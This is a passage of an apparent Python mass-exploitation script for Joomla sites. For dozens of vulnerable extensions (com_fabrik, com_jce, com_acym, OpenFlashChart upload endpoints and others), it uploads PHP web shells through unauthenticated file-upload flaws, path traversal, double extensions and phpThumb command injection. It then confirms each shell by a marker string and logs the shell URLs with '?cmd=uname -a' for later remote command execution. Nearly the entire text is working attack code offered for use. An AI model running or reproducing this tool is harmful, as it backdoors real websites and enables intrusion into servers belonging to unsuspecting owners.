            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln mod_simplefileuploadv1.3]'+la7mar+ '\n')
            pass
   
        try:
            izo = self.ran(10) + '.php'
            ShellFile = {'Filedata':(izo, shell,'text/html')}
            Datapost = {'folder': '/components/com_facileforms/libraries/jquery/'}
            requests.post(url + '/components/com_facileforms/libraries/jquery/uploadify.php', files=ShellFile, data=Datapost, headers=agent, timeout=10)
            CheckShell = requests.get(url + '/components/com_facileforms/libraries/jquery/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/components/com_facileforms/libraries/jquery/'+izo+'\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_facileformsy Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_facileforms]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_facileforms]'+la7mar+ '\n')
            pass

        try:

            izo = self.ran(10) + '.php'
            ShellFile = {'Filedata':(izo, shell,'text/html')}
            requests.post(url + '/administrator/components/com_extplorer/uploadhandler.php', files=ShellFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/images/stories/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/images/stories/'+izo+'\n')                
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_extplorer Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_extplorer]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_extplorer]'+la7mar+ '\n')
            pass
            
        try:
            izo = self.ran(10) + '.php'
            ShellFile = {'files[]': (izo, shell,'text/html')}
            Datapost = {'jpath': '../../../../'}
            requests.post(url    + '/administrator/components/com_rokdownloads/assets/uploadhandler.php', files=ShellFile, data=Datapost, timeout=10, headers=agent)
            CheckShell = requests.get(url    + '/images/stories/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url    + '/images/stories/'+izo+'\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_rokdownloads Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_rokdownloads]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_rokdownloads]'+la7mar+ '\n')
            pass
                
        try:
            izo = self.ran(10) + '.php'
            aaReflexup = {'file' :(izo, shell,'text/html')}
            Exp = url + "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
            requests.post(Exp, files=aaReflexup, timeout=10, headers=agent)
            Check = requests.get(url+'/'+izo, headers=agent,timeout=10)
            if 'RxR HaCkEr' in str(Check.text):
                with open('Vulns/shells.txt', 'a') as writer:
                    writer.write(url+'/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_fabrik new Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_fabrik new]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_fabrik new]'+la7mar+ '\n')
            pass
            
        try:
            post_data = {
                "name": "me.php",
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            }
            izo = self.ran(10) + '.php'
            izoo = self.ran(10) + '.PhP.txt'
            izooo = self.ran(10) + '.phP'
            Exp = url + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1"
            nGravreq = requests.post(Exp, data=post_data, timeout=10, headers=agent, files={'userfile':(izo, shell,'text/html')})
            nxxGravreq = requests.post(Exp, data=post_data, timeout=10, headers=agent, files={'userfile':(izoo, shell,'text/html')})
            nxxxGravreq = requests.post(Exp, data=post_data, timeout=10, headers=agent, files={'userfile':(izooo, shell,'text/html')})
            nGravlib = requests.get(url + '/media/'+izo, headers=agent,timeout=10)
            nxxGravlib = requests.get(url + '/media/'+izoo, headers=agent,timeout=10)
            nxxxGravlib = requests.get(url + '/media/'+izooo, headers=agent,timeout=10)                     
            if 'RxR HaCkEr' in str(nGravlib.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/media/'+izo+'\n')              
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [Com_Fabric Shell]'+ '\n')
                sys.exit()
            elif 'RxR HaCkEr' in str(nxxGravlib.text):

                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/media/'+izoo+'\n')              
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [Com_Fabric Shell]'+ '\n')
                sys.exit()
            elif 'RxR HaCkEr' in str(nxxxGravlib.text):

                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/media/'+izooo+'\n')              
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [Com_Fabric Shell]'+ '\n')
                sys.exit()         
            else:
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_Fabric]'+la7mar+ '\n')
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_Fabric]'+la7mar+ '\n')
            pass

        try:
            izo = self.ran(10) + '.php' 
            requests.post(url + '/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/'+izo+'?cmd=uname -a' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_acymailing Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_acymailing]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_acymailing]'+la7mar+ '\n')
            pass
            
        try:
            izo = self.ran(10) + '.php' 
            requests.post(url + '/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_jnewsletter Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jnewsletter]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jnewsletter]'+la7mar+ '\n')
            pass 
            
        try:
            fileindex = {'file': open(indeX, 'rb')}
            post_data = {"name": "vuln.php","submit": "Upload"}
            Exp = url + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=agent)
            if '"jsonrpc"' in str(GoT.text):
                requests.post(Exp, files=fileindex, data={"name": "vuln.phP"}, timeout=10, headers=agent)
                requests.post(Exp, files=fileindex, data={"name": "vuln.phtml"}, timeout=10, headers=agent)
                Check = requests.get(url + '/tmp/plupload/vuln.php', timeout=10, headers=agent)
                Check2 = requests.get(url + '/tmp/plupload/vuln.phP', timeout=10, headers=agent)
                Check3 = requests.get(url + '/tmp/plupload/vuln.phtml', timeout=10, headers=agent)
                CheckShell = requests.get(url + '/images/vuln.php', timeout=10, headers=agent)
            if 'Vuln' in str(Check.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/plupload/vuln.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_adsmanager Shell]'+ '\n')
            elif 'Vuln' in str(Check2.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/plupload/vuln.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_adsmanager Shell]'+ '\n')
            elif 'Vuln' in str(Check3.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/plupload/vuln.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_adsmanager Shell]'+ '\n')
            elif 'Vuln' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/plupload/vuln.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_adsmanager Shell]'+ '\n')                
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_adsmanager]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_adsmanager]'+la7mar+ '\n')
            pass
            
        try:
            izo = 'izo_'+self.ran(10)
            data = {'option':'com_acym','ctrl':'frontmails','task':'setNewIconShare','social':izo}
            r = req.post(url, data=data, files={"file":("lalala.php", shell_contentd, "text/php")}, timeout=10, headers=agent)
            Check = req.get(url  + '/media/com_acym/upload/socials/'+izo+'.php', headers=agent)
            if 'SEA-GHOST' in Check.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/media/com_acym/upload/socials/'+izo+'.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_acym Shell]'+ '\n')
            elif 'SEA-GHOST' in req.get(url  + '/media/com_acym/upload/socials/xxxdddshell.php').text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/media/com_acym/upload/socials/xxxdddshell.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_acym Shell]'+ '\n')
            else:
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[com_acym Failed]'+la7mar+ '\n')
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_acym]'+la7mar+ '\n')
            pass  

        try:
            izo = 'izo_'+self.ran(10)
            data = {'option':'com_acym','ctrl':'frontmails','task':'setNewIconShare','social':izo}
            r = req.post(url, data=data, files={"file":("lalala.php", shell, "text/html")}, timeout=10, headers=agent)
            Check = req.get(url  + '/media/com_acym/upload/socials/'+izo+'.php', headers=agent)
            if 'RxR HaCkEr' in Check.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/media/com_acym/upload/socials/'+izo+'.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_acym-2 Shell]'+ '\n')
            elif 'RxR HaCkEr' in req.get(url  + '/media/com_acym/upload/socials/xxxdddshell.php').text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/media/com_acym/upload/socials/xxxdddshell.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_acym-2 Shell]'+ '\n')
            else:
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[com_acym-2 Failed]'+la7mar+ '\n')
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_acym-2]'+la7mar+ '\n')
            pass 
              
        try:
            izo = self.ran(10) + '.php' 
            requests.post(url + '/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/administrator/components/com_jinc/classes/graphics/tmp-upload-images/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_jinc/classes/graphics/tmp-upload-images/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_jinc Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jinc]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jinc]'+la7mar+ '\n')
            pass        


        try:
            izo = self.ran(10) + '.php'  
            requests.post(url + '/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/'+izo + '\n')
                    print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_maianmedia Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_maianmedia]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_maianmedia]'+la7mar+ '\n')
            pass        


        try:
            izo = self.ran(10) + '.php'  
            requests.post(url + '/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_jnew Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jnew]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jnew]'+la7mar+ '\n')
            pass            
        try:

            ckme = requests.get(url + '/components/com_jmultimedia/assets/thumbs/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls -la;%20&phpThumbDebug=9',headers=agent,timeout=15)
            if 'rwxrwxr' in str(ckme.text):
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_jmultimedia Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/components/com_jmultimedia/assets/thumbs/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls -la;%20&phpThumbDebug=9'+'\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jmultimedia]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jmultimedia]'+la7mar+ '\n')
            pass


        try:

            ckme = requests.get(url + '/components/com_alphacontent/assets/phpThumb/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls -la;%20&phpThumbDebug=9',headers=agent,timeout=15)
            if 'rwxrwxr' in str(ckme.text):
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_alphacontent Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/components/com_alphacontent/assets/thumbs/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls -la;%20&phpThumbDebug=9'+'\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_alphacontent]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_alphacontent]'+la7mar+ '\n')
            pass            
        try:

            izo = self.ran(10) + '.php' 
            ShellFile = {'files[]':(izo, shell,'text/html')}
            requests.post(url + '/components/com_sexycontactform/fileupload/', files=ShellFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/components/com_sexycontactform/fileupload/files/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/components/com_sexycontactform/fileupload/files/'+izo+'\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_sexycontactform Shell]'+ '\n')

            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_sexycontactform]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_sexycontactform]'+la7mar+ '\n')
            pass             
        try:
            izo = self.ran(10) + '.php' 
            fgappgravkg  = {'upload-dir': '../../','upload-overwrite': '0','action': 'upload'}
            PostFile = {'Filedata':(izo, shell,'text/html')}
            requests.post(url + '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', data=fgappgravkg, files=PostFile, timeout=15, headers=agent)
            CheckShell = requests.get(url + '/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_jce Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jce]'+la7mar+ '\n')               
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jce]'+la7mar+ '\n')
            pass
            
        try:
            requests.post(url + '/index.php?option=com_b2jcontact&view=loader&type=uploader&'
                                            'owner=component&bid=1&qqfile=/../../../vuln.php',
                        data=shell, timeout=10, headers=agent)
            CheckSh = requests.get(url +'/components/com_b2jcontact/vuln.php', timeout=10, headers=agent)

            if 'RxR HaCkEr' in str(CheckSh.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(site + '/components/com_b2jcontact/vuln.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [Com_b2jcontact Shell]'+ '\n')
            else:
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_b2jcontact]'+la7mar+ '\n')
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_b2jcontact]'+la7mar+ '\n')
            pass
        try:
                izo = self.ran(10) + '.php.xxxjpg'
                com_myb = {'fileToUpload':(izo, shell,'text/html')}
                Exp = url + "/index.php?option=com_myblog&task=ajaxupload"
                requests.post(Exp, files=com_myb, timeout=10, headers=agent)
                shell_path = re.findall("source: '(.*?)'",requests.post.text)
                token = re.findall('(.*?).php', requests.post.text)
                cano = shell_path[0]+'.php.xxxjpg'
                check_shell = requests.get(cano)
                if 'RxR HaCkEr' in str(check_shell.text):
                        with open('Vulns/shells.txt', 'a') as writer:
                                writer.write(cano +'.php.xxxjpg' + '\n')
                        print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [Com_Myblog Shell]'+ '\n')
                else:
                    print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Com_Myblog]'+la7mar+ '\n')
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Com_Myblog]'+la7mar+ '\n') 
            pass
        try:
            izo = self.ran(10) + '.php'
            PostFile = {'Filedata':(izo, shell,'text/html')}
            requests.post(url + '/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php', files=PostFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/administrator/components/com_bt_portfolio/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_bt_portfolio/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_bt_portfolio Shell]'+ '\n')
            else: 
                 print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_bt_portfolio]'+la7mar+ '\n')               
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_bt_portfolio]'+la7mar+ '\n')
            #print(la5dhar + '[+] Shell Uploaded Success Joomla --> ' + url + '/templates/beez3//jsstrings.php' + '\n')
            pass
        try:
            izo = self.ran(10) + '.php'     
            image_myblog = izo
            com_myb = {'uploadfile':(image_myblog, shell,'text/html')}
            requests.post(url + '/modules/mod_socialpinboard_menu/saveimagefromupload.php', files=com_myb, timeout=15, headers=agent)
            token = re.findall('(.*?).php', requests.post.text)
            Exp = requests.get(url + '/modules/mod_socialpinboard_menu/images/socialpinboard/temp/'+token[0]+'.php', timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/modules/mod_socialpinboard_menu/images/socialpinboard/temp/'+token[0]+'.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [socialpinboard Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln socialpinboard]'+la7mar+ '\n')               
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln socialpinboard]'+la7mar+ '\n')
            pass 
        try:
            requests.post(url  + '/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=vuln.php', data=shell, headers=agent, timeout=10)
            Exp = requests.get(url  + '/administrator/components/com_redmystic/chart/tmp-upload-images/vuln.php', headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_redmystic/chart/tmp-upload-images/vuln.php' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_redmystic Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_redmystic]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_redmystic]'+la7mar+ '\n')
            pass 
        try:
            PostData = {'path': '../../../tmp/'}
            izo = self.ran(10) + '.php'
            fil = {'raw_data': (izo, shell, 'text/html')}
            requests.post(url + '/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php', files=fil, data=PostData, headers=agent, timeout=10)
            CheckShell = requests.get(url + '/tmp/up.php', headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/'+izo+'?cmd=uname -a' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_oziogallery Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_oziogallery]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_oziogallery]'+la7mar+ '\n')
            pass
        try:
            izo = self.ran(10) + '.php' 
            requests.post(url + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/'+izo+'?cmd=uname -a' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [Com_civicrm Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_civicrm]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_civicrm]'+la7mar+ '\n')
            pass
        try:
            izo = self.ran(10) + '.php' 
            requests.post(url + '/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/administrator/components/com_maian15/charts/tmp-upload-images/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/administrator/components/com_maian15/charts/tmp-upload-images/'+izo+'?cmd=uname -a' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_maian15 Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_maian15]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_maian15]'+la7mar+ '\n')
            pass
        try:
            izo = self.ran(10) + '.php'   
            PostFile = {'file':(izo, shell,'text/html')}
            requests.post(url + '/index.php?option=com_jwallpapers&task=upload', files=PostFile, timeout=10, headers=agent)
            CheckShell = requests.get(url + '/jwallpapers_files/plupload/'+izo, timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(CheckShell.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/jwallpapers_files/plupload/'+izo + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_jwallpapers Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jwallpapers]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_jwallpapers]'+la7mar+ '\n')
            pass            
        try:
            PostData = {'jpath': '..%2F..%2F..%2F..%2Ftmp%2F'}
            fil = {'file': ('vuln.php.xxxjpg', shell, 'text/html')}
            requests.post(url + '/administrator/components/com_simplephotogallery/lib/uploadFile.php', data=PostData, files=fil, timeout=10, headers=agent)
            Exp = requests.get(url + '/tmp/vuln.php.xxxjpg', timeout=10, headers=agent)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/tmp/vuln.php.xxxjpg' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [Com_simplephotogallery Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln cCom_simplephotogallery]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln Com_simplephotogallery]'+la7mar+ '\n')
            pass
        try:
            izo = self.ran(10) + '.php' 
            requests.post(url + '/index.php?option=com_agora&task=upload?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/acomponents/com_agora/img/members/0/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/components/com_agora/img/members/0/'+izo+'?cmd=uname -a' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_agora Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_agora]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_agora]'+la7mar+ '\n')
            pass

        try:
            izo = self.ran(10) + '.php' 
            requests.post(url + '/components/com_mtree/upload.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/components/com_mtree/img/listings/o/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/components/com_mtree/img/listings/o/'+izo+'?cmd=uname -a' + '\n')
                print(la5dhar +'[Joomla]'+ url + ' +++++++++++++ [com_mtree Shell]'+ '\n')
            else: 
                print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_mtree]'+la7mar+ '\n')                 
        except:
            print(la7mar +'[Joomla]'+cyan+url+cyan+la7mar +'[Not Vuln com_mtree]'+la7mar+ '\n')
            pass

        try:
            izo = self.ran(10) + '.php' 
            requests.post(url + '/modules/mod_artuploader/upload.php?name='+izo, data=shell, headers=agent, timeout=10)
            Exp = requests.get(url + '/modules/mod_artuploader/'+izo, headers=agent, timeout=10)
            if 'RxR HaCkEr' in str(Exp.text):
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url + '/modules/mod_artuploader/'+izo+'?cmd=uname -a' + '\n')
